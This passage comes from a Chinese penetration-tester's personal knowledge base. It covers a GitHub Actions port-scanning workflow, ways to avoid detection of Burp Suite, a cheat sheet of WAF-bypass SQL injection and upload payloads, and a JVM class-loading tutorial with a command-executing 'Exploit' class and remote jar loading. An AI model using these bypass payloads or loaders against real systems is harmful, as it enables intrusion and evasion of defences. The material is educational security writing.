完整的事件列表，请查看官方文档。除了代码库事件，GitHub Actions 也支持外部事件触发，或者定时运行。 on.. 指定触发事件时，可以限定分支或标签。 on: push: branches: - master 上面代码指定，只有master分支发生push事件时，才会触发 workflow。 jobs..name workflow 文件的主体是jobs字段，表示要执行的一项或多项任务。 jobs字段里面，需要写出每一项任务的job_id，具体名称自定义。job_id里面的name字段是任务的说明。 jobs: my_first_job: name: My first job my_second_job: name: My second job 上面代码的jobs字段包含两项任务，job_id分别是my_first_job和my_second_job。 jobs..needs needs字段指定当前任务的依赖关系，即运行顺序。 jobs: job1: job2: needs: job1 job3: needs: [job1, job2] 上面代码中，job1必须先于job2完成，而job3等待job1和job2的完成才能运行。因此，这个 workflow 的运行顺序依次为：job1、job2、job3。 jobs..runs-on runs-on字段指定运行所需要的虚拟机环境。它是必填字段。目前可用的虚拟机如下。 ubuntu-latest，ubuntu-18.04或ubuntu-16.04 windows-latest，windows-2019或windows-2016 macOS-latest或macOS-10.14 下面代码指定虚拟机环境为ubuntu-18.04。 runs-on: ubuntu-18.04 jobs..steps steps字段指定每个 Job 的运行步骤，可以包含一个或多个步骤。每个步骤都可以指定以下三个字段。 jobs..steps.name：步骤名称。 jobs..steps.run：该步骤运行的命令或者 action。 jobs..steps.env：该步骤所需的环境变量。 下面是一个完整的 workflow 文件的范例。 name: Greeting from Mona on: push jobs: my-job: name: My Job runs-on: ubuntu-latest steps: - name: Print a greeting env: MY_VAR: Hi there! My name is FIRST_NAME: Mona MIDDLE_NAME: The LAST_NAME: Octocat run: | echo $MY_VAR $FIRST_NAME $MIDDLE_NAME $LAST_NAME. 上面代码中，steps字段只包括一个步骤。该步骤先注入四个环境变量，然后执行一条 Bash 命令。 PortScan-AllPort分析 name: incloud # workflow名称 on: workflow_dispatch: # 手动触发 jobs: # 任务 build: # job id runs-on: ubuntu-latest # 指定运行所需要的虚拟机环境 steps: # 步骤 # Checkout a Git repository at a particular version - name: Checkout Repo # 步骤名 uses: actions/checkout@master # 指向一个分支 https://github.com/marketplace/actions/checkout # 配置Go环境 - name: Setup golang uses: actions/setup-go@v2 # https://github.com/marketplace/actions/setup-go-environment with: go-version: 1.14 # 安装依赖 - name: Setup Dependencies run: sudo apt-get install libpcap-dev - name: Cache Go id: cache-go uses: actions/cache@v2 with: path: /home/runner/go key: ${{ runner.os }}-go - name: Setting up ProjectDiscovery tools if: steps.cache-go.outputs.cache-hit != 'true' env: GO111MODULE: on run: | go get -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder go get -v github.com/projectdiscovery/dnsx/cmd/dnsx go get -v github.com/projectdiscovery/naabu/v2/cmd/naabu go get -v github.com/projectdiscovery/httpx/cmd/httpx go get -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei shell: bash - name: Running naabu to check top all ports run: | naabu -iL input/target.txt -rate 10000 -p - | tee output/active_ports.txt shell: bash - name: Running httpx for HTTP webservers probbing run: | httpx -l output/active_ports.txt -title httpx -l output/active_ports.txt | tee output/active_urls.txt shell: bash - name: Sorting the output results run: | find output -type f -exec sort {} -o {} \\; shell: bash # 更新扫描结果到github仓库中 - name: Create local changes run: | git add output/active_ports.txt git add output/active_urls.txt - name: Commit results to Github run: | git config --local user.email \"admin@inbug.org\" git config --global user.name \"inbug-team\" git commit -m \"InCloud Report\" -a --allow-empty - name: Push changes uses: ad-m/github-push-action@master with: github_token: ${{ secrets.GITHUB_TOKEN }} branch: ${{ github.ref }} 举一反三 分析发现也不是特别麻烦 只需要 配置环境 --> 安装工具 --> 下发扫描任务 --> 上传报告 即可 后续可根据自己的需求，编写特定的workflow执行相应的任务。 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-10-11 15:12:31 "},"个人知识库/01.渗透测试/06.保护自己/02.防止Burp被识别.html":{"url":"个人知识库/01.渗透测试/06.保护自己/02.防止Burp被识别.html","title":"02.防止Burp被识别","keywords":"","body":" 前言 识别原理 识别举例 识别扩展 防止识别方法 前言 读完这篇文章《精确判断网站访问者是否是黑客的方法》，确实感觉渗透越来越危险了，一不小心就被引入到蜜罐🍯了，一定要保护好自己，尽可能避免一切风险！ 识别原理 一般做渗透都会使用burpsuite来抓包测试，而挂着burp代理是可以访问http://burp这个地址的，就是下面这样，咱们通常下载Burp证书的地方 也就是说，如果识别到网站浏览者可以访问http://burp，那么就可以判定为攻击者 识别举例 原文作者给出了两种方法，一种是采用img标签，一种是采用script标签 采用img标签不存在跨域的问题，结合onload事件，如果能加载burp的图标http://burp/favicon.ico，就说明是攻击者，举例代码如下： 采用script标签的演示代码如下，但是通过测试并不能成功触发弹窗，可以在控制台看到错误信息 识别扩展 通过上面的内容，我们可以扩展一下，任意能够识别http://burp或相关内容是否能够访问的方法都可以用来判定是否为攻击者 上面主要是通过加载图标的手法，稍微修改下burp就可以去掉图标，那肯定需要找一个更稳定的方法去识别 查阅了一些资料，发现iframe标签也不存在跨域的问题，且网站可成功访问才能触发相关的事件，效果杠杠的，举例如下 这样太明显了，隐藏一下 再进阶一点 走了burp代理，就算目标不能访问，burp也会返回相关内容，这会让iframe认为加载成功，可以通过这个性质来判断是否使用了代理 所以也可以用如下的代码去测试 防止识别方法 通过研究发现，原文中直接不让访问http://burp也能通过识别扩展中的http://aaaa这种来识别发现是否使用了代理 解决办法也很简单，多谢R4ph4e1师傅，在Proxy --> Options中最下面，勾选如下图的2条即可 一个是关闭http://burp代理 一个是关闭burp自带的浏览器错误回显信息 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-10-11 15:12:31 "},"个人知识库/01.渗透测试/07.WAF绕过/WAF绕过通用思路.html":{"url":"个人知识库/01.渗透测试/07.WAF绕过/WAF绕过通用思路.html","title":"WAF绕过通用思路","keywords":"","body":" 概述 大小写 双写 编码 注释 垃圾字符 分块传输 HTTP协议绕过 HTTP 0.9 参数污染（HPP） Pipeline（keep-alive） HTTP charset WAF特性 云WAF绕过 白名单绕过 静态文件绕过 Content-Type绕过 请求方式绕过 解析兼容性 容器特性 参考 概述 通用的方法，不仅限于SQL注入，就是万金油，无非就是大小写、双写、编码、注释、垃圾字符、分块传输、HPP、WAF特性等 核心：所有能改的地方，都捣鼓捣鼓改改，增加就加，能删就删，多拿点其他内容来混淆视听。 大小写 unIoN Select 双写 一些后端可能会直接给关键词过滤为空，那么就可以利用双写来绕过 ununionion ==> 去掉union ==> union 编码 URL编码 Unicode编码 十六进制编码 其他后端会解析的编码 注释 如mysql中的内联注释，可以用来代替空格 注释也可以和换行搭配使用，注释掉后面的内容，再通过换行逃逸到注释之外 test.php?id=1 /*!order*//**/%23A%0A/**/%23A%0A/*!by*//**/2 垃圾字符 一些WAF设置了过滤的数据包长度，如果数据包太大太长，为了考虑性能就会直接略过这个数据包 GET /foo?sqli=111...80万个1...111'+and+2*3=6+--+ HTTP/1.1 User-Agent: Mozilla/5.0 Host: Host Accept: */* 分块传输 burp插件：https://github.com/c0ny1/chunked-coding-converter.git 在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，post请求报文中的数据部分需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的，也不包括分块数据结尾的，且最后需要用0独占一行表示结束。 HTTP协议绕过 HTTP 0.9 HTTP 0.9协议只有GET方法，且没有HEADER信息等，WAF就可能认不出这种的请求包，于是达到绕过WAF的效果 参数污染（HPP） 简单来说，存在多个同名参数的情况下，可能存在逻辑层和WAF层对参数的取值不同，即可能逻辑层使用的第一个参数，而WAF层使用的第二个参数，我们只需要第二个参数正常，在第一个参数插入payload，这样组合起来就可以绕过WAF，如下数据包： GET /foo?par=first&par=last HTTP/1.1 User-Agent: Mozilla/5.0 Host: Host Accept: */* 部分中间件的处理方法： Web环境 参数获取函数 获取到的参数 PHP/Apache $_GET(\"par\") last JSP/Tomcat Request.getParameter(\"par\") first Perl(CGI)/Apache Param(\"par\") first Python/Apache getvalue(\"par\") [\"first\",\"last\"] ASP.NET/IIS Request.QueryString(\"par\") first,last Pipeline（keep-alive） http请求头部中有Connection这个字段，建立的tcp连接会根据此字段的值来判断是否断开，当发送的内容太大，超过一个http包容量，需要分多次发送时，值会变成keep-alive，即本次发起的http请求所建立的tcp连接不断开，直到所发送内容结束Connection为close为止 我们可以手动将此值置为keep-alive，然后在http请求报文中构造多个请求，将恶意代码隐藏在第n个请求中，从而绕过waf 记得把brupsuite自动更新Content-Length的勾去掉 大概数据包就是这样 POST / HTTP/1.1 Host: www.baidu.com User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Upgrade-Insecure-Requests: 1 Connection: Keep-Alive Content-Type: application/x-www-form-urlencoded Content-Length: 3 a=1GET / HTTP/1.1 Host: www.baidu.com User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Upgrade-Insecure-Requests: 1 Connection: close HTTP charset 利用Content-Type: xxx;charset=xxx编码绕过，payload转义后，由于大部分的WAF默认用UTF8编码检测，所以能用此方法来达到绕过关键词过滤的效果 application/x-www-form-urlencoded; charset=ibm037 multipart/form-data; charset=ibm037, boundary=blah multipart/form-data; boundary=blah ; charset=ibm037 WAF特性 云WAF绕过 找到真实IP，修改本地hosts文件或者直接在burp中指定解析，避免流量走到云WAF上即可。 白名单绕过 一些WAF为了保证核心功能如登陆功能正常，会在内部设立一个文件白名单，或内容白名单，只要和这些文件或内容有关，无论怎么测试，都不会进行拦截。 如：WAF设立了白名单/admin，那么我们的测试payload可以通过如下的手法来绕过 # 原来被拦截 http://a.a/?id=123 and 2*3=6 # 现在不拦截 http://a.a/?a=/admin&id=123 and 2*3=6 静态文件绕过 一些WAF为了减少服务器的压力，会对静态文件如.png、.css等直接放行，那么我们可以尝试伪装成静态文件来绕过 如： # 原来被拦截 http://a.a/?id=123 and 2*3=6 # 现在不拦截 http://a.a/?1.jpg&id=123 and 2*3=6 Content-Type绕过 一些WAF识别到特定的content-type后，则会判定为该请求的类型，如： 发现Content-Type为multipart/form-data时，会认为这属于文件上传的请求，从而只检测文件上传漏洞，导致不拦截其他类型的payload 请求方式绕过 一些WAF对于get请求和post请求的处理机制不一样，可能对POST请求稍加松懈，因此给GET请求变成POST请求有可能绕过拦截。 一些WAF检测到POST请求后，就不会对GET携带的参数进行过滤检测，因此导致被绕过。 解析兼容性 一些WAF检测时，完全按照标准的HTTP协议去匹配，但WEB容器会做一些兼容性适配，如上传时 filename=\"shell.php\" 我们只需要稍加修改，那么按照标准协议去解析就找不到文件名，从而绕过拦截 filename=\"shell.php filename='shell.php' filename=shell.php 容器特性 [!tip] 可通过所有fuzz一遍，看看容器是如何处理的 IIS+ASP： %会被自动去掉 unicode会自动解码 == tomcat: 路径穿越 /path1/path2/ == ;/path1;foo/path2;bar/; 参考 waf绕过拍了拍你 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-03-08 14:45:19 "},"个人知识库/02.代码审计/01.Java安全/01.审计基础/01.JVM类加载机制.html":{"url":"个人知识库/02.代码审计/01.Java安全/01.审计基础/01.JVM类加载机制.html","title":"01.JVM类加载机制","keywords":"","body":" 类的加载机制 类的生命周期 加载：查找并加载类的二进制数据 校验：确保被加载的类的正确性 准备：为类的静态变量分配内存，并将其初始化为默认值 解析：把类中的符号引用转换为直接引用 初始化：对类的静态变量，静态代码块执行初始化操作 类初始化的步骤 触发类初始化的时机 以下几种情况不会执行类初始化 使用 卸载 类加载器 什么是类加载器 类加载器的层次 启动类加载器(Bootstrap ClassLoader) 扩展类加载器(Extension ClassLoader) 应用程序类加载器(Application ClassLoader) 注意 类加载的几种方式 JVM类加载机制 全盘负责 父类委托 缓存机制 双亲委派机制 类的双亲委派机制 双亲委派机制的工作流程 双亲委派机制的优点 双亲委派机制代码实现 类加载器的核心方法 自定义类加载器 URLClassLoader 参考 类的加载机制 Java是一个依赖于JVM(Java虚拟机)实现的跨平台的开发语言。Java程序在运行前需要先编译成class文件，Java类初始化的时候会调用 java.lang.ClassLoader加载类字节码，ClassLoader会调用JVM的native方法(defineClass0/1/2)来定义一个java.lang.Class实例。 Java虚拟机把描述类的数据从Class文件加载到内存，并对数据进行校验、转换解析和初始化，最终形成可以被虚拟机直接使用的Java类型，这个过程被称作虚拟机的类加载机制。 类的生命周期 类从被加载到虚拟机内存中开始，到卸载出内存为止，它的整个生命周期包括：加载，校验，准备，解析，初始化,使用,卸载这7个阶段.其中其中验证、准备、解析3个部分统称为链接。 加载、校验、准备、初始化和卸载这五个阶段的顺序是确定的，类型的加载过程必须按照这种顺序按部就班地开始，而解析阶段则不一定：它在某些情况下可以在初始化阶段之后再开始，这是为了支持Java语言的运行时绑定特性（也称为动态绑定或晚期绑定） 注意，这里的几个阶段是按顺序开始，而不是按顺序进行或完成，因为这些阶段通常都是互相交叉地混合进行的，通常在一个阶段执行的过程中调用或激活另一个阶段。 加载：查找并加载类的二进制数据 在加载阶段，虚拟机需要完成以下3件事情： 1）通过一个类的全限定名来获取定义此类的二进制字节流。 2）将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构。 3）在内存中生成一个代表这个类的java.lang.Class对象，作为方法区这个类的各种数据的访问入口。 校验：确保被加载的类的正确性 验证是连接阶段的第一步，这一阶段的目的是为了确保Class文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身的安全。验证阶段大致会完成4个阶段的检验动作: 文件格式验证: 验证字节流是否符合Class文件格式的规范；例如: 是否以0xCAFEBABE开头、主次版本号是否在当前虚拟机的处理范围之内、常量池中的常量是否有不被支持的类型。 元数据验证：对字节码描述的信息进行语义分析(注意: 对比javac编译阶段的语义分析)，以保证其描述的信息符合Java语言规范的要求；例如: 这个类是否有父类，除了java.lang.Object之外。 字节码验证：通过数据流和控制流分析，确定程序语义是合法的、符合逻辑的。 符号引用验证：确保解析动作能正确执行。 验证阶段是非常重要的，但不是必须的，它对程序运行期没有影响，如果所引用的类经过反复验证，那么可以考虑采用-Xverifynone参数来关闭大部分的类验证措施，以缩短虚拟机类加载的时间。 准备：为类的静态变量分配内存，并将其初始化为默认值 准备阶段是正式为类变量分配内存并设置类变量初始值的阶段，这些变量所使用的内存都将在方法区中进行分配。 该阶段的注意事项： 这时候进行内存分配的仅包括类变量（被static修饰的变量），而不包括实例变量，实例变量将会在对象实例化时随着对象一起分配在Java堆中。 这里所设置的初始值通常情况下是数据类型默认的零值(如0、0L、null、false等)，而不是被在Java代码中被显式地赋予的值。 比如：假设一个类变量的定义为: public static int value = 3；那么变量value在准备阶段过后的初始值为0，而不是3，因为这时候尚未开始执行任何Java方法，而把value赋值为3的put static指令是在程序编译后，存放于类构造器()方法之中的，所以把value赋值为3的动作将在初始化阶段才会执行。 对基本数据类型来说，对于类变量(static)和全局变量，如果不显式地对其赋值而直接使用，则系统会为其赋予默认的零值，而对于局部变量来说，在使用前必须显式地为其赋值，否则编译时不通过。 对于同时被static和final修饰的常量，必须在声明的时候就为其显式地赋值，否则编译时不通过；而只被final修饰的常量则既可以在声明时显式地为其赋值，也可以在类初始化时显式地为其赋值，总之，在使用前必须为其显式地赋值，系统不会为其赋予默认零值。 对于引用数据类型reference来说，如数组引用、对象引用等，如果没有对其进行显式地赋值而直接使用，系统都会为其赋予默认的零值，即null。 如果在数组初始化时没有对数组中的各元素赋值，那么其中的元素将根据对应的数据类型而被赋予默认的零值。 如果类字段的字段属性表中存在ConstantValue属性，即同时被final和static修饰，那么在准备阶段变量value就会被初始化为ConstValue属性所指定的值。 假设上面的类变量value被定义为: public static final int value = 3；编译时Javac将会为value生成ConstantValue属性，在准备阶段虚拟机就会根据ConstantValue的设置将value赋值为3。我们可以理解为static final常量在编译期就将其结果放入了调用它的类的常量池中 解析：把类中的符号引用转换为直接引用 解析阶段是虚拟机将常量池内的符号引用替换为直接引用的过程，解析动作主要针对类或接口、字段、类方法、接口方法、方法类型、方法句柄和调用点限定符7类符号引用进行。符号引用就是一组符号来描述目标，可以是任何字面量。 直接引用就是直接指向目标的指针、相对偏移量或一个间接定位到目标的句柄。 初始化：对类的静态变量，静态代码块执行初始化操作 初始化，为类的静态变量赋予正确的初始值，JVM负责对类进行初始化，主要对类变量进行初始化。在Java中对类变量进行初始值设定有两种方式: 声明类变量是指定初始值 使用静态代码块为类变量指定初始值 类初始化的步骤 假如这个类还没有被加载和连接，则程序先加载并连接该类 假如该类的直接父类还没有被初始化，则先初始化其直接父类 假如类中有初始化语句，则系统依次执行这些初始化语句 触发类初始化的时机 只有当对类的主动使用的时候才会导致类的初始化，类的主动使用包括以下六种: 使用new关键字实例化对象的时候。 读取或设置一个类型的静态字段（被final修饰、已在编译期把结果放入常量池的静态字段除外）的时候。 调用一个类型的静态方法的时候。 使用java.lang.reflect包的方法对类型进行反射调用的时候，如果类型没有进行过初始化，则需要先触发其初始化。 当初始化类的时候，如果发现其父类还没有进行过初始化，则需要先触发其父类的初始化。 当虚拟机启动时，用户需要指定一个要执行的主类（包含main()方法的那个类），虚拟机会先初始化这个主类。 以下几种情况不会执行类初始化 通过子类引用父类的静态字段，只会触发父类的初始化，而不会触发子类的初始化。 定义对象数组，不会触发该类的初始化。 常量在编译期间会存入调用类的常量池中，本质上并没有直接引用定义常量的类，不会触发定义常量所在的类。 通过类名获取 Class 对象，不会触发类的初始化。 通过 Class.forName 加载指定类时，如果指定参数 initialize 为 false 时，也不会触发类初始化，其实这个参数是告诉虚拟机，是否要对类进行初始化。 通过 ClassLoader 默认的 loadClass 方法，也不会触发初始化动作。 使用 类访问方法区内的数据结构的接口， 对象是Heap区的数据。 卸载 Java虚拟机将结束生命周期的几种情况 执行了System.exit()方法 程序正常执行结束 程序在执行过程中遇到了异常或错误而异常终止 由于操作系统出现错误而导致Java虚拟机进程终止 类加载器 什么是类加载器 虚拟机设计团队把类加载阶段中的==通过一个类的全限定名来获取描述此类的二进制字节流==这个动作放到Java虚拟机外部去实现，以便让应用程序自己决定如何去获取所需要的类。 实现这个动作的代码模块称为类加载器。 一切的Java类都必须经过JVM加载后才能运行，而ClassLoader的主要作用就是Java类文件的加载。 对于任意一个类，都需要由加载它的类加载器和这个类本身一同确立其在 Java 虚拟机的唯一性，每个类加载器都拥有一个独立的类命名空间。也就是说：比较两个类是否「相等」，要在这两个类是由同一个类加载器加载的前提下才有意义，否则，即使这两个类来源于同一个 Class 文件，被同一个虚拟机加载，只要加载它们的类加载器不同，那这两个类就必定不相等。 类加载器的层次 从Java虚拟机的角度来讲，只存在两种不同的类加载器： 一种是启动类加载器（Bootstrap ClassLoader），这个类加载器使用C++语言实现，是虚拟机自身的一部分，负责加载JDK中的核心类库，类似于操作系统启动时的boot loader 另一种就是所有其他的类加载器，这些类加载器都由Java语言实现，独立于虚拟机外部，并且全都继承自抽象类java.lang.ClassLoader。 从Java开发人员的角度来看，类加载器还可以划分得更细致一些，绝大部分Java程序都会使用到以下3种系统提供的类加载器: 启动类加载器(Bootstrap ClassLoader) 启动类加载器是最底层的类加载器，是JVM的一部分，它是由C++语言实现的，且没有父加载器，也没有继承java.lang.ClassLodaer类。 这个类加载器负责将存放在＜JAVA_HOME＞/lib和＜JAVA_HOME＞/jre/lib目录中的，或者被-Xbootclasspath参数所指定的路径中的，并且是虚拟机识别的类库加载到虚拟机内存中。（按照文件名识别，如tools.jar、rt.jar，名字不符合的类库即使放在lib目录中也不会被加载） 处于安全考虑，根类加载器只加载java、javax、sun开头的类。 public class TestClassLoader { public static void main(String[] args) { System.out.println(java.lang.String.class.getClassLoader()); // null } } 扩展类加载器(Extension ClassLoader) 这个加载器由sun.misc.Launcher$ExtClassLoader实现，它负责加载＜JAVA_HOME＞/lib/ext和＜JAVA_HOME＞/jre/lib/ext目录中的，或者被java.ext.dirs系统变量所指定的路径中的所有类库，开发者可以直接使用扩展类加载器。 public class TestClassLoader { public static void main(String[] args) { System.out.println(com.sun.nio.zipfs.ZipFileStore.class.getClassLoader()); // sun.misc.Launcher$ExtClassLoader@6bc168e5 } } 应用程序类加载器(Application ClassLoader) 这个类加载器由sun.misc.Launcher$AppClassLoader来实现。 由于应用程序类加载器是ClassLoader类中的getSystemClassLoader()方法的返回值，所以有些场合中也称它为“系统类加载器”。 ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader(); 它负责加载用户类路径（ClassPath）上所有的类库，开发者同样可以直接在代码中使用这个类加载器。如果应用程序中没有自定义过自己的类加载器，一般情况下这个就是程序中默认的类加载器。 public class TestClassLoader { public static void main(String[] args) { System.out.println(TestClassLoader.class.getClassLoader()); // sun.misc.Launcher$AppClassLoader@18b4aac2 } } 我们的应用程序都是由这3种类加载器互相配合进行加载的，如果有必要，还可以加入自己定义的类加载器。 注意 某些时候我们获取一个类的类加载器时候可能会返回一个null值，如:java.io.File.class.getClassLoader()将返回一个null对象，因为java.io.File类在JVM初始化的时候会被Bootstrap ClassLoader(引导类加载器)加载(该类加载器实现于JVM层，采用C++编写)，我们在尝试获取被Bootstrap ClassLoader类加载器所加载的类的ClassLoader时候都会返回null。 import java.io.File; public class TestClassLoader { public static void main(String[] args) { System.out.println(File.class.getClassLoader()); } } 类加载的几种方式 Java类加载方式分为显式和隐式,显式即我们通常使用Java反射或者ClassLoader来动态加载一个类对象，而隐式指的是类名.方法名()或new类实例。显式类加载方式也可以理解为类动态加载，我们可以自定义类加载器去加载任意的类。 命令行启动应用时候由JVM初始化加载 通过Class.forName()方法动态加载 通过ClassLoader.loadClass()方法动态加载 public class TestClassLoader { public static void main(String[] args) throws ClassNotFoundException { // 默认会执行初始化静态代码块 Class.forName(\"Test\"); // 使用应用程序类加载器来加载类Test，不会执行初始化静态代码块 ClassLoader appClassLoader = ClassLoader.getSystemClassLoader(); appClassLoader.loadClass(\"Test\"); //forName指定了classLoader，initialize为false不会执行初始化静态代码块，为true则会执行 Class.forName(\"Test\", false, appClassLoader); } } class Test { static { System.out.println(\"静态方法被执行了\"); } } 分别运行上面几种类加载方式，可以看出来Class.forName()和ClassLoader.loadClass()的区别 Class.forName(): 将类的.class文件加载到jvm中之外，还会对类进行解释，执行类中的static块； ClassLoader.loadClass(): 只干一件事情，就是将.class文件加载到jvm中，不会执行static中的内容,只有在newInstance()才会去执行static块; Class.forName(name, initialize, loader)带参函数也可控制是否加载static块。并且只有调用了newInstance()方法采用调用构造函数，创建类的对象。 JVM类加载机制 全盘负责 当一个类加载器负责加载某个Class时，该Class所依赖的和引用的其他Class也将由该类加载器负责载入，除非显示使用另外一个类加载器来载入。 父类委托 先让父类加载器试图加载该类，只有在父类加载器无法加载该类时才尝试从自己的类路径中加载该类。 缓存机制 缓存机制将会保证所有加载过的Class都会被缓存，当程序中需要使用某个Class时，类加载器先从缓存区寻找该Class，只有缓存区不存在，系统才会读取该类对应的二进制数据，并将其转换成Class对象，存入缓存区。这就是为什么修改了Class后，必须重启JVM，程序的修改才会生效。 双亲委派机制 双亲委派模型的工作过程是：如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一个层次的类加载器都是如此，因此所有的加载请求最终都应该传送到最顶层的启动类加载器中，只有当父加载器反馈自己无法完成这个加载请求（它的搜索范围中没有找到所需的类）时，子加载器才会尝试自己去完成加载。 类的双亲委派机制 上图展示的类加载器之间的这种层次关系，称为类加载器的双亲委派模型（Parents Delegation Model）。 双亲委派模型要求除了顶层的启动类加载器外，其余的类加载器都应当有自己的父类加载器。 这里类加载器之间的父子关系一般不会以继承（Inheritance）的关系来实现，而是都使用组合（Composition）关系来复用父加载器的代码。 类加载器的双亲委派模型在JDK1.2期间被引入并被广泛应用于之后几乎所有的Java程序中，但它并不是一个强制性的约束模型，而是Java设计者推荐给开发者的一种类加载器实现方式. 双亲委派机制的工作流程 如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一个层次的类加载器都是如此，因此所有的加载请求最终都应该传送到最顶层的启动类加载器中，只有当父加载器反馈自己无法完成这个加载请求（它的搜索范围中没有找到所需的类）时，子加载器才会尝试自己去完成加载。 举例： 当AppClassLoader加载一个class时，它首先不会自己去尝试加载这个类，而是把类加载请求委派给父类加载器ExtClassLoader去完成。 当ExtClassLoader加载一个class时，它首先也不会自己去尝试加载这个类，而是把类加载请求委派给BootStrapClassLoader去完成。 如果BootStrapClassLoader加载失败(例如在$JAVA_HOME/jre/lib里未查找到该class)，会使用ExtClassLoader来尝试加载； 若ExtClassLoader也加载失败，则会使用AppClassLoader来加载，如果AppClassLoader也加载失败，则会报出异常ClassNotFoundException。 代码举例： /** * 输出结果： * sun.misc.Launcher$AppClassLoader@18b4aac2 * sun.misc.Launcher$ExtClassLoader@61064425 * null */ public class TestClassLoader { public static void main(String[] args) { ClassLoader loader= TestClassLoader.class.getClassLoader(); while(loader!=null){ System.out.println(loader); loader=loader.getParent(); } System.out.println(loader); } } 双亲委派机制的优点 使用双亲委派模型来组织类加载器之间的关系，有一个显而易见的好处就是Java类随着它的类加载器一起具备了一种带有优先级的层次关系。 例如类java.lang.Object，它存放在rt.jar之中，无论哪一个类加载器要加载这个类，最终都是委派给处于模型最顶端的启动类加载器进行加载，因此Object类在程序的各种类加载器环境中都是同一个类。相反，如果没有使用双亲委派模型，由各个类加载器自行去加载的话，如果用户自己编写了一个称为java.lang.Object的类，并放在程序的ClassPath中，那系统中将会出现多个不同的Object类，Java类型体系中最基础的行为也就无法保证，应用程序也将会变得一片混乱。 所以它的优点 系统类防止内存中出现多份同样的字节码 保证Java程序安全稳定运行 双亲委派机制代码实现 代码实现主要在ClassLoader类的loadClass函数中 由此也可看出，我们如果要自定义一个类加载器，那么需要重写的就是findClass()方法，而不是loadClass()方法 类加载器的核心方法 loadClass(加载指定的Java类) findClass(查找指定的Java类) findLoadedClass(查找JVM已经加载过的类) defineClass(定义一个Java类) resolveClass(链接指定的Java类) 自定义类加载器 通常情况下，我们都是直接使用系统类加载器。但是有的时候，我们也需要自定义类加载器。比如应用是通过网络来传输Java类的字节码，为保证安全性，这些字节码经过了加密处理，这时系统类加载器就无法对其进行加载，这样则需要自定义类加载器来实现。 利用自定义类加载器我们可以在webshell中实现加载并调用自己编译的类对象，比如本地命令执行漏洞调用自定义类字节码的native方法绕过RASP检测，也可以用于加密重要的Java类字节码(只能算弱加密了)。 自定义类加载器一般都是继承自ClassLoader类，从上面对loadClass方法来分析来看，我们只需要重写 findClass 方法即可。 注意： 这里传递的文件名需要是类的全限定性名称，即com.test.Test格式的，因为 defineClass 方法是按这种格式进行处理的。 最好不要重写loadClass方法，因为这样容易破坏双亲委托模式。 这类Test类本身可以被 AppClassLoader 类加载，因此我们不能把com/test/Test 放在类路径下。否则，由于双亲委托机制的存在，会直接导致该类由 AppClassLoader 加载，而不会通过我们自定义类加载器来加载。 举例：此处我通过本地class文件的字节码来加载class 需要加载的class源码 import java.io.BufferedReader; import java.io.InputStream; import java.io.InputStreamReader; public class Exploit{ public Exploit() throws Exception { Process p = Runtime.getRuntime().exec(new String[]{\"open\", \"-na\", \"Calculator\"}); InputStream is = p.getInputStream(); BufferedReader reader = new BufferedReader(new InputStreamReader(is)); String line; while((line = reader.readLine()) != null) { System.out.println(line); } p.waitFor(); is.close(); reader.close(); p.destroy(); } public static void main(String[] args) throws Exception { } } 编译成class文件 javac Exploit.java JVM执行的其实就是javap命令生成的字节码(ByteCode)。 编写TestClassLoader加载这个class import java.io.ByteArrayOutputStream; import java.io.FileInputStream; import java.io.IOException; import java.io.InputStream; public class TestClassLoader extends ClassLoader { /** * 重写了findClass方法 */ @Override protected Class findClass(String name) throws ClassNotFoundException { byte[] bytes = new byte[0]; try { bytes = loadClassData(); } catch (IOException e) { e.printStackTrace(); } if (bytes == null) { throw new ClassNotFoundException(name); } else { return defineClass(\"Exploit\", bytes, 0, bytes.length); } } /** * 给class文件以字节码的形式返回 */ private byte[] loadClassData() throws IOException { String fileName = \"/Users/d4m1ts/d4m1ts/tools/exp/exphub/fastjson/Exploit.class\"; try { InputStream ins = new FileInputStream(fileName); ByteArrayOutputStream baos = new ByteArrayOutputStream(); int bufferSize = 1024; byte[] buffer = new byte[bufferSize]; int length = 0; while ((length = ins.read(buffer)) != -1) { baos.write(buffer, 0, length); } return baos.toByteArray(); } catch (IOException e) { e.printStackTrace(); } return null; } public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException { TestClassLoader testClassLoader = new TestClassLoader(); // loadClass的时候上层的ClassLoader都找不到对应的类，所以会调用它自己的findClass去加载类 Class test = testClassLoader.loadClass(\"Exploit\"); System.out.println(test.getClassLoader()); // 申请实例 test.newInstance(); } } URLClassLoader URLClassLoader继承了ClassLoader，URLClassLoader提供了加载远程资源的能力，在写漏洞利用的payload或者webshell的时候我们可以使用这个特性来加载远程的jar来实现远程的类方法调用。 远程类我们还是使用我们自定义类加载器中编译的Exploit.class吧 下方命令给class打包成jar，也可以直接压缩为zip再改后缀 jar cvf Exploit.jar Exploit.class 编写远程加载jar代码 import java.io.IOException; import java.net.URL; import java.net.URLClassLoader; public class TestClassLoader { public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, InstantiationException { // 